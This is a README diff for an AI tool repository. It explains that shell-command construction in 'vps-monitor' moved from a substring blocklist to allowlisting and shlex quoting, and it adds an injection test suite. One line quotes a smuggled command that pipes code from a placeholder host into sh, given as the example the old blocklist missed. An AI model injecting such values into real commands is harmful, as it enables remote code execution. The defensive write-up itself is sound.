@@ -52,7 +52,14 @@ expires, so a long-running session does not die halfway through a task.
 **Docstrings are the interface.** A tool's docstring is what the model reads to decide whether to
 call it, so every tool has one and a test fails the build if a tool loses it.
 
-**The tests are guards, not decoration.** Three of them exist to catch the mistakes that actually
+**Arguments are validated, not screened.** `vps-monitor` builds shell commands, and an earlier
+version of it interpolated tool arguments straight into a string that a remote shell ran, guarded
+only by a blocklist of dangerous substrings. That was not a control — a blocklist enumerates what
+its author remembered, and `web; curl example.com/x | sh` matched none of it. Arguments are now
+checked against an allowlist of shapes and quoted with `shlex.quote`, host keys are verified with
+`accept-new`, and the blocklist is gone. `tests/test_command_safety.py` keeps it gone.
+
+**The tests are guards, not decoration.** Four suites exist to catch the mistakes that actually
 happen in a repository like this:
 
 | Test | What it prevents |
@@ -60,6 +67,7 @@ happen in a repository like this:
 | `tests/test_no_secrets.py` | A credential, private key or real IP address reaching a commit — in code, in an example, or in this README |
 | `tests/test_config_contract.py` | Setup instructions drifting from the code, so a fresh clone fails with `KeyError` instead of starting |
 | `tests/test_readme_matches_code.py` | This README promising a tool that no longer exists, or hiding one that does |
+| `tests/test_command_safety.py` | A tool argument breaking out of the shell command it lands in — 20 injection payloads, plus regression guards on the two mistakes that made it possible |
 
 Run them with:
 
